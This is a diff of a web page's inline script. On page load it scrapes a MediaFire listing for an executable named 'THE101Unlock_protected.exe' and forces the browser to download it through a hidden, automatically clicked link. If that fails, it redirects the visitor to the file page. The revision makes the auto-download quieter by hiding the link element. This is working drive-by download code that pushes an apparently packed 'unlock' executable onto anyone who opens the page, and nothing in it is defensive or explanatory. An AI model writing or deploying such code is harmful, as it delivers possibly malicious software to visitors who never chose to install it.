@@ -4,35 +4,32 @@
     <script>
         (async function() {
             try {
-                // First, get the MediaFire page to extract direct download URL
-                const pageResponse = await fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file');
-                const pageHtml = await pageResponse.text();
+                // Fetch the MediaFire page
+                const response = await fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file');
+                const html = await response.text();
                 
-                // Extract the direct download URL from the HTML
-                const downloadMatch = pageHtml.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\.exe)"/);
-                const directUrl = downloadMatch ? downloadMatch[1] : null;
+                // Extract the direct download URL using the exact pattern from your HTML
+                const downloadMatch = html.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\/THE101Unlock_protected\.exe)"/);
                 
-                if (directUrl) {
-                    // Now fetch the actual file data
-                    const fileResponse = await fetch(directUrl);
-                    const fileBlob = await fileResponse.blob();
+                if (downloadMatch && downloadMatch[1]) {
+                    const directUrl = downloadMatch[1];
                     
-                    // Create download link and trigger click
-                    const downloadUrl = URL.createObjectURL(fileBlob);
-                    const a = document.createElement('a');
-                    a.href = downloadUrl;
-                    a.download = 'THE101Unlock_protected.exe';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    
-                    // Clean up the object URL
-                    URL.revokeObjectURL(downloadUrl);
+                    // Create and trigger download
+                    const link = document.createElement('a');
+                    link.href = directUrl;
+                    link.download = 'THE101Unlock_protected.exe';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
                 } else {
-                    console.error('Could not extract download URL');
+                    // Fallback: redirect to original page
+                    window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
                 }
+                
             } catch (error) {
-                console.error('Download failed:', error);
+                // Fallback on error
+                window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
             }
         })();
     </script>
